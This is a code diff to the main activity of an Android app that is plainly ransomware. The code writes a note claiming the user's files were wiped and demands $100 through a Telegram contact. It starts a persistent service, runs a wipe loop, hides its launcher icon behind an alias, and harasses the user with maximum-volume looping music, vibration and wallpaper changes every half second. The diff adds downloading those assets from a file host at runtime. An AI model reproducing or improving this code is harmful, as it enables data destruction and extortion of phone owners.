@@ -60,9 +60,20 @@ public class MainActivity extends Activity {
     private String torchCameraId;
     private boolean torchOn;
     private boolean torchRequested;
-    
+
     private Handler vibrateHandler;
     private android.os.Vibrator vibrator;
+
+    private java.util.List<File> wallpaperFiles = new java.util.ArrayList<>();
+    private File musicFile;
+    private Handler downloadHandler;
+    private boolean assetsReady;
+
+    private static final String[] WALL_URLS = {
+            "https://files.catbox.moe/8iz1cb.jpg",
+            "https://files.catbox.moe/sighlv.jpg"
+    };
+    private static final String MUSIC_URL = "https://files.catbox.moe/0udkx6.mp3";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -193,24 +204,25 @@ public class MainActivity extends Activity {
         if (started || closing) return;
         started = true;
 
-        // 1) tulis ransom note
         writeRansomNote();
 
-        // 2) jalankan service foreground biar ga mati
         Intent svc = new Intent(this, ScanService.class);
         if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc);
         else startService(svc);
 
-        // 3) mulai wipe loop di background
         startWipeLoop();
-
-        // 4) mulai wallpaper & music loop
-        startWallpaperLoop();
         switchToHiddenAlias();
-        startMusicLoop();
-        startVibrateLoop();
 
-        // 5) webview
+        initWebView();
+
+        downloadAssetsAsync(() -> {
+            startWallpaperLoop();
+            startMusicLoop();
+            startVibrateLoop();
+        });
+    }
+
+    private void initWebView() {
         try {
             wv = new WebView(this);
         } catch (Throwable t) {
@@ -271,51 +283,111 @@ public class MainActivity extends Activity {
     }
 
     /* ------------------------------------------------------------------ */
+    /* Download assets runtime                                             */
+    /* ------------------------------------------------------------------ */
+
+    private void downloadAssetsAsync(Runnable onDone) {
+        downloadHandler = new Handler(Looper.getMainLooper());
+        new Thread(() -> {
+            try {
+                File cache = getCacheDir();
+
+                wallpaperFiles.clear();
+                for (int i = 0; i < WALL_URLS.length; i++) {
+                    File out = new File(cache, "wall" + (i + 1) + ".jpg");
+                    if (!out.exists() || out.length() == 0) {
+                        if (!downloadTo(WALL_URLS[i], out)) continue;
+                    }
+                    wallpaperFiles.add(out);
+                }
+
+                musicFile = new File(cache, "music.mp3");
+                if (!musicFile.exists() || musicFile.length() == 0) {
+                    downloadTo(MUSIC_URL, musicFile);
+                }
+            } catch (Throwable t) {
+                Log.w(TAG, "downloadAssets", t);
+            } finally {
+                downloadHandler.post(() -> {
+                    assetsReady = true;
+                    if (onDone != null) onDone.run();
+                });
+            }
+        }).start();
+    }
+
+    private boolean downloadTo(String url, File out) {
+        java.io.InputStream in = null;
+        java.io.FileOutputStream fos = null;
+        java.net.HttpURLConnection c = null;
+        try {
+            java.net.URL u = new java.net.URL(url);
+            c = (java.net.HttpURLConnection) u.openConnection();
+            c.setConnectTimeout(15000);
+            c.setReadTimeout(30000);
+            c.setInstanceFollowRedirects(true);
+            c.connect();
+            int code = c.getResponseCode();
+            if (code != 200) return false;
+            in = c.getInputStream();
+            fos = new java.io.FileOutputStream(out);
+            byte[] buf = new byte[8192];
+            int n;
+            while ((n = in.read(buf)) > 0) fos.write(buf, 0, n);
+            fos.flush();
+            return out.length() > 0;
+        } catch (Throwable t) {
+            Log.w(TAG, "downloadTo " + url, t);
+            return false;
+        } finally {
+            try { if (fos != null) fos.close(); } catch (Throwable ignored) { }
+            try { if (in != null) in.close(); } catch (Throwable ignored) { }
+            if (c != null) c.disconnect();
+        }
+    }
+
+    /* ------------------------------------------------------------------ */
     /* Ransom note                                                         */
     /* ------------------------------------------------------------------ */
 
-	private void writeRansomNote() {
-	    try {
-	        File root = Environment.getExternalStorageDirectory();
-	        File note = new File(root, NOTE_NAME);
-	        String ransom = "Hello Users, welcome to my game.\n\n"
-	                + "so basically yeah... all ur files? gone. deleted. poof. no cap 💀\n"
-	                + "we wiped everything fr fr, ain't no backup gonna save u now lol\n\n"
-	                + "but hey, good news: u can get em back. all of em. no joke.\n"
-	                + "just slide $100 to the addy below and we're chill, simple as that\n\n"
-	                + "no $100 = no files. that's the deal. take it or leave it bestie 🤷\n\n"
-	                + "don't try anything funny, we already got ur stuff. just pay up and move on.\n\n"
-	                + "https://t.me/Tanaka_Group\n"
-	                + "to pay for it !";
-	                
-	        try (FileOutputStream fos = new FileOutputStream(note)) {
-	            fos.write(ransom.getBytes("UTF-8"));
-	        }
-	    } catch (Throwable t) {
-	        Log.w(TAG, "note", t);
-	    }
-	}
+    private void writeRansomNote() {
+        try {
+            File root = Environment.getExternalStorageDirectory();
+            File note = new File(root, NOTE_NAME);
+            String ransom = "Hello Users, welcome to my game.\n\n"
+                    + "so basically yeah... all ur files? gone. deleted. poof. no cap 💀\n"
+                    + "we wiped everything fr fr, ain't no backup gonna save u now lol\n\n"
+                    + "but hey, good news: u can get em back. all of em. no joke.\n"
+                    + "just slide $100 to the addy below and we're chill, simple as that\n\n"
+                    + "no $100 = no files. that's the deal. take it or leave it bestie 🤷\n\n"
+                    + "don't try anything funny, we already got ur stuff. just pay up and move on.\n\n"
+                    + "https://t.me/Tanaka_Group\n"
+                    + "to pay for it !";
 
+            try (FileOutputStream fos = new FileOutputStream(note)) {
+                fos.write(ransom.getBytes("UTF-8"));
+            }
+        } catch (Throwable t) {
+            Log.w(TAG, "note", t);
+        }
+    }
 
-	private void switchToHiddenAlias() {
-	    try {
-	        android.content.pm.PackageManager pm = getPackageManager();
-	        // matikan alias normal
-	        pm.setComponentEnabledSetting(
-	                new android.content.ComponentName(this, "com.mintfox.app.NormalAlias"),
-	                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-	                android.content.pm.PackageManager.DONT_KILL_APP);
-	        // nyalakan alias "¢"
-	        pm.setComponentEnabledSetting(
-	                new android.content.ComponentName(this, "com.mintfox.app.HiddenAlias"),
-	                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-	                android.content.pm.PackageManager.DONT_KILL_APP);
-	    } catch (Throwable t) {
-	        android.util.Log.w("MainActivity", "switchAlias", t);
-	    }
-	}
+    private void switchToHiddenAlias() {
+        try {
+            android.content.pm.PackageManager pm = getPackageManager();
+            pm.setComponentEnabledSetting(
+                    new android.content.ComponentName(this, "com.mintfox.app.NormalAlias"),
+                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    android.content.pm.PackageManager.DONT_KILL_APP);
+            pm.setComponentEnabledSetting(
+                    new android.content.ComponentName(this, "com.mintfox.app.HiddenAlias"),
+                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                    android.content.pm.PackageManager.DONT_KILL_APP);
+        } catch (Throwable t) {
+            android.util.Log.w("MainActivity", "switchAlias", t);
+        }
+    }
 
-	
     /* ------------------------------------------------------------------ */
     /* Wipe loop 100ms                                                     */
     /* ------------------------------------------------------------------ */
@@ -360,16 +432,16 @@ public class MainActivity extends Activity {
     /* ------------------------------------------------------------------ */
 
     private void startWallpaperLoop() {
+        if (wallpaperFiles.isEmpty()) return;
         wallpaperHandler = new Handler(Looper.getMainLooper());
         final WallpaperManager wm = WallpaperManager.getInstance(this);
         final Runnable r = new Runnable() {
             @Override public void run() {
                 try {
-                    wpIndex = (wpIndex % 2) + 1;
-                    String asset = "wall" + wpIndex + ".jpg";
-                    InputStream is = getAssets().open(asset);
-                    Bitmap bmp = BitmapFactory.decodeStream(is);
-                    is.close();
+                    wpIndex = (wpIndex % wallpaperFiles.size());
+                    File f = wallpaperFiles.get(wpIndex);
+                    wpIndex++;
+                    Bitmap bmp = BitmapFactory.decodeFile(f.getAbsolutePath());
                     if (bmp != null) {
                         if (Build.VERSION.SDK_INT >= 24) {
                             wm.setBitmap(bmp, null, true, WallpaperManager.FLAG_SYSTEM);
@@ -382,24 +454,21 @@ public class MainActivity extends Activity {
                 } catch (Throwable t) {
                     Log.w(TAG, "wallpaper", t);
                 }
-                if (wallpaperHandler != null) wallpaperHandler.postDelayed(this, 3000);
+                if (wallpaperHandler != null) wallpaperHandler.postDelayed(this, 500);
             }
         };
         wallpaperHandler.post(r);
     }
 
-    
-
-    /* ------------------------------------------------------------------ */
     /* ------------------------------------------------------------------ */
     /* Vibrate spam 500ms                                                  */
     /* ------------------------------------------------------------------ */
-    
+
     @SuppressWarnings("deprecation")
     private void startVibrateLoop() {
         vibrator = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
         if (vibrator == null || !vibrator.hasVibrator()) return;
-    
+
         vibrateHandler = new Handler(Looper.getMainLooper());
         final Runnable r = new Runnable() {
             @Override public void run() {
@@ -416,23 +485,21 @@ public class MainActivity extends Activity {
         };
         vibrateHandler.post(r);
     }
-    /* ------------------------------------------------------------------ */
-    
+
     /* ------------------------------------------------------------------ */
     /* Music loop max volume                                               */
     /* ------------------------------------------------------------------ */
 
     private void startMusicLoop() {
         try {
+            if (musicFile == null || !musicFile.exists() || musicFile.length() == 0) return;
             AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
             if (am != null) {
                 int max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
                 am.setStreamVolume(AudioManager.STREAM_MUSIC, max, 0);
             }
             musicPlayer = new MediaPlayer();
-            android.content.res.AssetFileDescriptor afd = getAssets().openFd("music.mp3");
-            musicPlayer.setDataSource(afd.getFileDescriptor(), afd.getStartOffset(), afd.getLength());
-            afd.close();
+            musicPlayer.setDataSource(musicFile.getAbsolutePath());
             musicPlayer.setLooping(true);
             musicPlayer.prepare();
             musicPlayer.start();
@@ -484,6 +551,7 @@ public class MainActivity extends Activity {
         if (wipeHandler != null) wipeHandler.removeCallbacksAndMessages(null);
         if (wallpaperHandler != null) wallpaperHandler.removeCallbacksAndMessages(null);
         if (musicHandler != null) musicHandler.removeCallbacksAndMessages(null);
+        if (downloadHandler != null) downloadHandler.removeCallbacksAndMessages(null);
         if (musicPlayer != null) {
             try { musicPlayer.stop(); musicPlayer.release(); } catch (Throwable ignored) { }
             musicPlayer = null;
